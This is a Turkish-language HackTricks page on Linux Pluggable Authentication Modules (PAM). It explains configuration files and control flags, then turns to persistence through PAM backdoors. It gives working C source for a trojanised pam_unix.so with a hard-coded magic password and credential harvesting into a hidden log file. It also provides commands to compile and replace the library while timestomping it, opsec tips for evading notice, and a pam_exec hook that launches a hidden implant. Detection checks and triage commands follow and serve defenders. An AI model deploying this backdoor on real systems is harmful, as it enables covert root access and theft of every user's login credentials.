# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Temel Bilgiler

**PAM (Pluggable Authentication Modules)** bir güvenlik mekanizması olarak **bilgisayar hizmetlerine erişmeye çalışan kullanıcıların kimliklerini doğrular**, erişimlerini çeşitli kriterlere göre kontrol eder. Bu, yalnızca yetkili kullanıcıların belirli hizmetlerle etkileşime girmesini sağlayan ve sistemin aşırı yüklenmesini önlemek için kullanımını kısıtlayabilecek dijital bir kapı görevlisine benzer.

#### Yapılandırma Dosyaları

- **Solaris ve UNIX tabanlı sistemler** genellikle `/etc/pam.conf` konumunda bulunan merkezi bir yapılandırma dosyası kullanır.
- **Linux sistemleri** dizin tabanlı bir yaklaşımı tercih ederek hizmete özel yapılandırmaları `/etc/pam.d` içinde saklar. Örneğin, login servisi için yapılandırma dosyası `/etc/pam.d/login` konumunda bulunur.

Login servisi için bir PAM yapılandırma örneği şöyle görünebilir:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Yönetim Alanları**

Bu alanlar, veya yönetim grupları, **auth**, **account**, **password**, ve **session**'ı içerir; her biri kimlik doğrulama ve oturum yönetimi sürecinin farklı yönlerinden sorumludur:

- **Auth**: Kullanıcının kimliğini doğrular, genellikle parola isteyerek.
- **Account**: Hesap doğrulamasını yapar; grup üyeliği veya günün saatine bağlı kısıtlamalar gibi koşulları kontrol eder.
- **Password**: Parola güncellemelerini yönetir; karmaşıklık kontrolleri veya sözlük saldırılarını önleme gibi işlemleri kapsar.
- **Session**: Bir servis oturumunun başlangıcında veya sonunda dizin bağlama ya da kaynak limitleri belirleme gibi eylemleri yönetir.

#### **PAM Modül Kontrolleri**

Kontroller, modülün başarı veya başarısızlığa verdiği yanıtı belirler ve genel kimlik doğrulama sürecini etkiler. Bunlar şunlardır:

- **Required**: Bir required modülün başarısızlığı sonuçta başarısızlığa yol açar, ancak yalnızca sonraki tüm modüller kontrol edildikten sonra.
- **Requisite**: Başarısızlık durumunda işlemin derhal sonlandırılması.
- **Sufficient**: Başarı, sonraki bir modül başarısız olmadıkça aynı alanın kalan kontrollerinin atlanmasını sağlar.
- **Optional**: Yığında tek modül olması durumunda başarısızlığa yol açar.

#### Örnek Senaryo

Birden fazla auth modülünün bulunduğu bir yapılandırmada süreç katı bir sırayı takip eder. `pam_securetty` modülü giriş terminalini yetkisiz bulursa root girişleri engellenir, ancak "required" statüsü nedeniyle tüm modüller yine de işlenir. `pam_env` ortam değişkenlerini ayarlar ve bu kullanıcı deneyimine yardımcı olabilir. `pam_ldap` ve `pam_unix` modülleri kullanıcının kimliğini doğrulamak için birlikte çalışır; `pam_unix` daha önce sağlanmış bir parolayı kullanmayı dener ve bu, kimlik doğrulama yöntemlerinde verimlilik ve esneklik sağlar.


## Backdooring PAM – Hooking `pam_unix.so`

Yüksek değerli Linux ortamlarında klasik bir kalıcılık numarası, meşru PAM kütüphanesini **trojanised drop-in** ile değiştirmektir. Çünkü her SSH / konsol girişi `pam_unix.so:pam_sm_authenticate()` çağrısını yaptığı için, kimlik bilgilerini yakalamak veya *magic* parola bypassı uygulamak için birkaç satır C yeterlidir.

### Derleme Hızlı Başvuru
<details>
<summary>Örnek `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Derle ve stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – geçici bir dosyaya yazın ve yarım yazılmış kütüphanelerin SSH'yi engellemesini önlemek için `mv` ile yerine taşıyın.
2. Log dosyası yerleştirmesi, ör. `/usr/bin/.dbus.log`, meşru masaüstü öğeleriyle karışır.
3. PAM'ın hatalı davranmasını önlemek için sembol export'larını (`pam_sm_setcred`, vb.) aynı tutun.

### Detection
* `pam_unix.so`'un MD5/SHA256 değerlerini distro paketininkilerle karşılaştırın.
* Elle hash hesaplamadan değiştirilmiş kütüphaneleri tespit etmek için `rpm -V pam` veya `debsums -s libpam-modules` kullanın.
* `/lib/security/` altında world-writable veya olağandışı sahiplik için kontrol edin.
* `auditd` kuralı: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Beklenmeyen modüller için PAM konfigürasyonlarını grep ile tarayın: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Quick triage commands (post-compromise or threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Kalıcılık için `pam_exec`'in kötüye kullanımı
`pam_unix.so`'yu değiştirmek yerine, daha hafif bir yöntem `/etc/pam.d/sshd` dosyasına bir `pam_exec` satırı eklemektir; böylece her SSH oturumu normal yığını olduğu gibi bırakarak bir implant başlatır:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` sshd PAM bağlamı içinde root olarak çalışır, bu yüzden script reverse shells bırakabilir, env vars toplayabilir veya çekirdek kütüphanelerde dosya sistemi değişikliği olmadan implanted sockets'ları yeniden açabilir.

## Referanslar

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
